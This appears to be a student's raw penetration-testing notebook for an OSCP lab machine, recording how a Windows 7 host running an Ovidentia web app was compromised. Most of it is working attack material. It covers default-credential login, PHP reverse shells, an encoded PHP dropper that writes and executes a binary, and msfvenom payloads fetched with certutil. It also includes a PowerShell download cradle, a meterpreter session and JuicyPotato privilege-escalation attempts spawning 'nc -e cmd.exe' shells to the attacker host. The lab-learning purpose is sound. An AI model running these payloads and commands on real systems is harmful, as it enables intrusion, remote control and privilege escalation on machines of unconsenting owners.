```shell
#initial enumeration ports:

135: msrpc
- probably not a way in
139:
- probably not
445:
- yes could be a way in smb commands
554:
- try nmap script: nmap -sV --script "rtsp-*" -p <PORT> <IP>
- possibly bruteforceable
1100:
- https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi
- highly probable attack vector, rmi vulnerability scripts at link above
- Java RMI - Server Insecure Default Configuration Java Code Execution (Metasploit)  | multiple/remote/17535.rb
2869: - web server need to dirbust either way - website doesnt load
- https://learn.microsoft.com/en-us/security-updates/securitybulletins/2007/ms07-019
- RCE allowed on windows XP, maybe a vector but probably not - smb os discovery states it Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) which wouldnt be vulnerable.
3306:
- exisitng mysql server
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
5357: - get service unavailable - used for network discovery
5800 & 5900:https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc
- nothing immediately until on box, probablky not initial access.
8014: not found when browsing to it
8080: Permission Denied: 192.168.119.132 when browsing to it
- need to searchsploit Apache httpd 2.4.9 ((Win32) PHP/5.5.12)
- nothing for apache version
# could be of interest
- PHP < 5.6.2 - 'Shellshock' Safe Mode / disable_functions Bypass / Command Injectio | php/webapps/35146.txt
```

```shell
#beginning webfuzzing on port 8080
```

![[1. brosing to web php.png]]

```shell
# potential command injection
```

![[OSCP/Pen-200 Labs/10.11.1.73 - gamma/screenshots/2. login page.png]]

```shell
# nothing @ robots.txt
```

![[OSCP/Pen-200 Labs/10.11.1.73 - gamma/screenshots/3. robots.txt.png]]

```shell
# know command injection is a vulnerbality, need to find a way to upload file
```

![[4. file manager.png]]
```shell
# know that you are able to upload a file, looking into code execution for java rmi
1100:
- https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi
- highly probable attack vector, rmi vulnerability scripts at link above
- Java RMI - Server Insecure Default Configuration Java Code Execution (Metasploit)  | multiple/remote/17535.rb

# exploits to look into so far:
PHP < 5.6.2 - 'Shellshock' Safe Mode / disable_functions Bypass / Command Injectio | php/webapps/35146.txt

 Java RMI - Server Insecure Default Configuration Java Code Execution (Metasploit)  | multiple/remote/17535.rb

```

```shell
# able to get into login server with default credentials.
# ALWAYS LOOK INTO DEFRAULT CREDENTIALS

Option 1: Shared and self resetting Ovidentia demo

    Username: admin@admin.bab.
    Password: 012345678.
```

![[5. default credential login..png]]

```shell
# able to upload php files to the file manager
```

![[6, filemanager.png]]


```shell
# going to put pentest monkey rev shell

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.119.132';  // CHANGE THIS
$port = 2323;       // CHANGE THIS

#2nd shell
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.119.132';  // CHANGE THIS
$port = 443;       // CHANGE THIS
```

```shell
# getting error, going to look into it and reset box.
```

![[7. error.png]]


```shell
# going to have to mess with the configuration for file uploads
```


![[8. file upload config.png]]

```shell
#changed file upload settings as well as directory able to upload files now under file manager
```

![[9. file upload settings changed.png]]


```shell
#no way to upload files even after being able to change folders
# need to find a way to modify file permissions
```

![[10..png]]

```shell
# gave everyone rights to everything in the directory portion
```
![[11..png]]

```shell
# now giving everyone rights to do anything to directory lol
```
![[12..png]]

```shell
# still didnt work, adding admins to delegation over eveything
```

![[13..png]]

![[14..png]]

```shell
# set rules of the site to the admin change i created
```
![[15..png]]


```shell
# still not working, messing with web services
```

![[16..png]]


```shell
# had to click file manager on the right side of the screen in green
```


```shell
#php file upload was too big, change file config again.
```
![[17..png]]

```shell
# still getting error
```
![[18..png]]


```shell
#changed to no limit and it worked
```

![[19..png]]


```shell
# uploaded file, need to find the directory that it was placed in
```


![[20..png]]

```shell
# potential folder path doesnt work, but could be something

C:/filemanager/hello/fileManager/collectives/DG0/lol/
```
![[21..png]]

```shell
# took out the C:\ in the file upload configuration
```
![[22..png]]


```shell
# made directory named hello and have to re edit it under file manager on the left side of the screen
```

![[23..png]]


```shell
# followed these instructions to get the path of where the files are being placed
This is a very confusing web app that took me days of figuring out to understand.  
  
Login creds are obtained thru some research about the web app.  
  
After you get in, you'll see that the left hand purple side is the admin panel. The right hand green side is the user panel. If you try to create a folder, you'll get an error that says Characters do not match what is allowed or something like that, even if you're just using ASCII.  
  
To fix this, go to the Sites option on the left hand purple admin section. Select the default site, the only option. Select file upload config. Change those options around to anything but the default setting. Now you should be able to create a new folder.  
  
To create a new folder, browse back to the left hand purple admin section. Go to File Manager. Here you can create folders and give yourself full permissions to do whatever you want. After you do this, a new File Manager option will appear on the right hand green user panel, where you can interact with the folder and upload files.  
  
You upload files, they go nowhere. You need to find the directory path. To find this, create your folder first. Then go back to the file upload config in the admin panel. Change the file upload path to something else. Now try to access your folder again. The screen will scream out an important clue that can help you, it'll be in big bold red colors and you can't miss it.  
  
Priv esc is pretty easy. Some basic enum and Google, you'll find the right priv esc exploit on exploitdb. The exploit author was very generous and left a whole essay of comments that will reflect what your enumeration already found.


C:/cool/fileManager/collectives/DG0/here/


C:/coolio/fileManager/collectives/DG0/nothere/php-reverse-shell.php



C:/notcool/fileManager/collectives/DG0/please/

C:/notcool/fileManager/collectives/DG0/actual/notreally
```


```shell
#restarted device to try again

if you haven't done these steps, make sure you do them. They're from the forums:

  - Go to "sites" > "ovidentia" > "web services" 

- Give access to everything to user's and admins 

- Go to "Sites" > "ovidentia" > "File upload configuration" 

- Here is what got me: the default value should read “C:/wamp/www/PHP/upload”, change "upload" to the name of the folder you want to create Example: ""C:/wamp/www/PHP/myfolder" 

- Go to "File Manager" > Add 

- For name just put the directory name “myfolder” 

- Select "Add", you now have a folder created. 


folder/fileManager/collectives/DG0/myfolder/

C:/wamp/www/PHP/folder/fileManager/collectives/DG0/myfolder/
```


```shell
# finally got it to work, the rev shell still didnt work tho.
# this was the location, wasnt finding it becuase the one i was using had php not capitalized....
http://10.11.1.73:8080/PHP/FOLDER/fileManager/collectives/DG0/folder/php-reverse-shell.php

```

![[24. failed revshell.png]]


```shell
#used this webshell and it worked perfect

https://github.com/artyuum/simple-php-web-shell/blob/master/index.php
```

![[25. webshell.png]]


```shell
# system info
Host Name:                 GAMMA
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          admin
Registered Organization:   
Product ID:                00371-868-0000007-85567
Original Install Date:     12/31/2014, 1:50:35 PM
System Boot Time:          8/4/2022, 12:11:53 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     1,023 MB
Available Physical Memory: 382 MB
Virtual Memory: Max Size:  2,047 MB
Virtual Memory: Available: 602 MB
Virtual Memory: In Use:    1,445 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\GAMMA
Hotfix(s):                 6 Hotfix(s) Installed.
                           [01]: KB2534111
                           [02]: KB2999226
                           [03]: KB3045171
                           [04]: KB3124280
                           [05]: KB4012212
                           [06]: KB976902
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.11.1.73
                                 [02]: fe80::4953:2482:19cf:44d9
```

```shell
# going to try to upload a revshell for x86 to windows box to get a revshell.

msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.132 LPORT=2323 -f exe > shell.exe

# going to put msfvenom onto desktop
dir C:\Users\Jill\Desktop

#made msfvenom x86 shellcode

┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.73]
└─# ls    
17535.rb  35146.txt  php-reverse-shell.php  php-web.php  shell.exe

#setup http server
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.73]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

#setup listener
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 2323           
listening on [any] 2323 ...



# in webshell grabbing and putting on desktop of jill
certutil.exe -urlcache -split -f "http://192.168.119.132/shell.exe 

# connected but shell is unstable
```

```shell
# trying this reverse shell

<?php

header('Content-type: text/plain');

$ip = "192.168.119.132"; //change this

$port = "2222"; //change this

$payload = "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";

$evalCode = gzinflate(base64_decode($payload));

$evalArguments = " ".$port." ".$ip;

$tmpdir ="C:\\windows\\temp";

chdir($tmpdir);

$res .= "Using dir : ".$tmpdir;

$filename = "D3fa1t_shell.exe";

$file = fopen($filename, 'wb');

fwrite($file, $evalCode);

fclose($file);

$path = $filename;

$cmd = $path.$evalArguments;

$res .= "\n\nExecuting : ".$cmd."\n";

echo $res;

$output = system($cmd);

?>




# xferring over windows-rev-shell.php
certutil.exe -urlcache -split -f "http://192.168.119.132/windows-rev-shell.php 

#setting up listener
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.73]
└─# nc -lvnp 2222
listening on [any] 2222 ...


# did not work,
fuck it im going to use a msfconsole revshell

# meterpreter shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.132 LPORT=3434 -f exe > reverse.exe


#setup listener in multihandler

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     3434             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set lhost tun0
lhost => 192.168.119.132
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.119.132:4444 

#getting file

certutil.exe -urlcache -split -f "http://192.168.119.132/reverse.exe"

and executed

```

```shell
# got reverse shell

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.119.132:3434 
[*] Sending stage (175686 bytes) to 10.11.1.73
[*] Meterpreter session 1 opened (192.168.119.132:3434 -> 10.11.1.73:50084) at 2023-03-31 00:10:11 -0400

meterpreter > whoami
[-] Unknown command: whoami
meterpreter > migrate
Usage: migrate <<pid> | -P <pid> | -N <name>> [-t timeout]

Migrates the server instance to another process.
NOTE: Any open channels or other dynamic state will be lost.

meterpreter > shell
Process 5000 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\wamp\www\PHP\folder\fileManager\collectives\DG0\folder>

#transferring over winpeas

certutil.exe -urlcache -split -f "http://192.168.119.132/winPEASany.exe"

```

```shell
# unable to run winpeas any, grabbing winPEASx86.exe

/home/kali/Documents/transfer/PEAS/winPEASx86.exe


certutil.exe -urlcache -split -f "http://192.168.119.132/winPEASx86.exe"

# still cant run winPEAS.

# looking up kernel priv esc for Windows 7 professional 6.1.7601 Service Pack 1 Build 7601

# Powerup.ps1 results
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\wamp\www\PHP\folder\fileManager\collectives\DG0\folder>echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.119.132:80/PowerUp.ps1') | powershell -noprofile -
echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.119.132:80/PowerUp.ps1') | powershell -noprofile -


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 828
ProcessId   : 6124
Name        : 6124
Check       : Process Token Privileges


# going to try printspoofer.

certutil.exe -urlcache -split -f "http://192.168.119.132/PrintSpoofer.exe"

#need x86 exploit

C:\wamp\www\PHP\folder\fileManager\collectives\DG0\folder>PrintSpoofer.exe
PrintSpoofer.exe
This version of C:\wamp\www\PHP\folder\fileManager\collectives\DG0\folder\PrintSpoofer.exe is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need a x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.

```

```shell
# have to use juicy potato 32 bit, so i grabbed one from here https://github.com/k4sth4/Juicy-Potato and had to look up clsid from the same spot in the github

# have to also transfer over netcat to the victim machine as well as jp32.exe

certutil.exe -urlcache -split -f "http://192.168.119.132/nc.exe"
certutil.exe -urlcache -split -f "http://192.168.119.132/jp32.exe"

# exploit to run and syntax on the victim machine, make sure to have listener up
jp32.exe -l 4443 -p c:\\windows\\system32\\cmd.exe -a "nc.exe -e cmd.exe 192.168.119.132 4443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}


#failed

C:\wamp\www\PHP\folder\fileManager\collectives\DG0\folder>jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "nc.exe -e cmd.exe 192.168.119.132 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}
jp32.exe -l 443 -p cmd.exe -a "nc.exe -e cmd.exe 192.168.119.132 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}
Testing {659cdea7-489e-11d9-a9cd-000d56965251} 443
COM -> recv failed with error: 10038

C:\wamp\www\PHP\folder\fileManager\collectives\DG0\folder>


jp32.exe -l 4445 -p cmd.exe -a "nc.exe -e cmd.exe 192.168.119.132 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}

# trying a different clsid
jp32.exe -l 4445 -p cmd.exe -a "nc.exe -e cmd.exe 192.168.119.132 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}


# transferring and executing test.bat to get a valid clsid to mask ask
certutil.exe -urlcache -split -f "http://192.168.119.132/test.bat"

# made CLSID.list and transferring over to test CLSIDs
certutil.exe -urlcache -split -f "http://192.168.119.132/CLSID.list"
```


```shell
#results from test.bat
C:\wamp\www\PHP\folder\fileManager\collectives\DG0\folder>test.bat
test.bat
{555F3418-D99E-4E51-800A-6E89CFD8B1D7} 10000
{03ca98d6-ff5d-49b8-abc6-03dd84127020} 10000
{F087771F-D74F-4C1A-BB8A-E16ACA9124EA} 10001
{6d18ad12-bde3-4393-b311-099c346e6df9} 10002
{4991d34b-80a1-4291-83b6-3328366b9097} 10003
{69AD4AEE-51BE-439b-A92C-86AE490E8B30} 10004
{659cdea7-489e-11d9-a9cd-000d56965251} 10005

# spit out clsid's to try with exploit
C:\wamp\www\PHP\folder\fileManager\collectives\DG0\folder>type result.log
type result.log
{03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\SYSTEM - nope
{F087771F-D74F-4C1A-BB8A-E16ACA9124EA};NT AUTHORITY\SYSTEM - nope
{6d18ad12-bde3-4393-b311-099c346e6df9};NT AUTHORITY\SYSTEM - nope
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM - nope
{69AD4AEE-51BE-439b-A92C-86AE490E8B30};NT AUTHORITY\SYSTEM - nope
{659cdea7-489e-11d9-a9cd-000d56965251};NT AUTHORITY\SYSTEM - nope

C:\wamp\www\PHP\folder\fileManager\collectives\DG0\folder>


c:\\wamp\\www\\PHP\\folder\\fileManager\\collectives\\DG0\\folder\\jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\wamp\\www\\PHP\\folder\\fileManager\\collectives\\DG0\\folder\\nc.exe -e cmd.exe 192.168.119.132" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```


```shell
#trying regular juicypotato
certutil.exe -urlcache -split -f "http://192.168.119.132/JuicyPotato.exe"


JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "192.168.119.132 2000 -e cmd.exe" -t t -c {555F3418-D99E-4E51-800A-6E89CFD8B1D7}



ShellHWDetection

{555F3418-D99E-4E51-800A-6E89CFD8B1D7}

NT AUTHORITY\SYSTEM

BITS

{03ca98d6-ff5d-49b8-abc6-03dd84127020}

NT AUTHORITY\SYSTEM

BITS

{F087771F-D74F-4C1A-BB8A-E16ACA9124EA}

NT AUTHORITY\SYSTEM

BITS

{69AD4AEE-51BE-439b-A92C-86AE490E8B30}

{6d18ad12-bde3-4393-b311-099c346e6df9}

NT AUTHORITY\SYSTEM

BITS

{69AD4AEE-51BE-439b-A92C-86AE490E8B30}

{4991d34b-80a1-4291-83b6-3328366b9097}

NT AUTHORITY\SYSTEM

BITS

{69AD4AEE-51BE-439b-A92C-86AE490E8B30}

{69AD4AEE-51BE-439b-A92C-86AE490E8B30}

NT AUTHORITY\SYSTEM

BITS

{69AD4AEE-51BE-439b-A92C-86AE490E8B30}

{659cdea7-489e-11d9-a9cd-000d56965251}

NT AUTHORITY\SYSTEM
```


```shell
# trying get clsid powershell script to grab valid clsids and it didnt work.

echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.119.132:80/GetCLSID.ps1 ') | powershell -noprofile -


# downloaded a new juicy potato version

certutil.exe -urlcache -split -f "http://192.168.119.132/Juicy.Potato.x86.exe"

Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {555F3418-D99E-4E51-800A-6E89CFD8B1D7}

jp32.exe -l 443 -p cmd.exe -a "nc.exe -e cmd.exe 192.168.119.132 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}

Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "nc.exe -e cmd.exe 192.168.119.132 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}


Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "nc.exe -e cmd.exe 192.168.119.132 443" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}



Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "nc.exe -e cmd.exe 192.168.119.132 443" -t * -c {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}

